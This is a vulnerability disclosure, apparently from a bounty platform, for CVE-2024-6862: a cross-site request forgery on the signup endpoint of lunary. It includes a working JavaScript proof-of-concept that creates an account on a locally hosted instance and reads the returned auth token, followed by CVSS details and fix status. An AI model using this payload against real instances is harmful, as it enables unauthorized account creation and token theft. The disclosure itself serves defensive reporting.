@@ -1,0 +1,51 @@
+Title: CSRF on endpoint for user signup in lunary-ai/lunary
+
+Proof of Concept: 
+Run an instance of lunary, with the backend running at e.g. localhost:3333.
+Host the following payload on a standard http-server:
+
+<script>
+    const req = new XMLHttpRequest();
+        req.onreadystatechange = function () {
+        if (req.readyState == XMLHttpRequest.DONE) {
+            // Here, with a valid token one can use the token to perform other requests
+            // (Create projects, log stuff, etc.)
+            console.log(JSON.parse(req.response).token);
+        }
+    }
+    
+    req.open("POST", "http://localhost:3333/auth/signup");
+    req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    req.send(JSON.stringify({
+        "email": "somemail@a.com",
+        "password": "somepassword",
+        "name": "somename",
+        "projectName": "Project #1",
+        "orgName": "someone's Org",
+        "employeeCount": "6-49",
+        "whereFindUs": "hackernews",
+        "signupMethod": "signup"
+    }));
+</script>
+
+Impact: 
+This vulnerability makes it possible for attackers to use a hosted instance of lunary through CSRF, even though the instance itself is not exposed to the network. This can also be misused to pollute the app with an arbitrary number of organisations/users.
+
+CVE ID: CVE-2024-6862
+Status: (published)
+Vulnerability Type: CWE-352: Cross-Site Request Forgery (CSRF)
+Severity: High (7.4)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Changed
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Npm
+Affected Version: 1.2.34
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $450
+Fix Bounty: $112.5
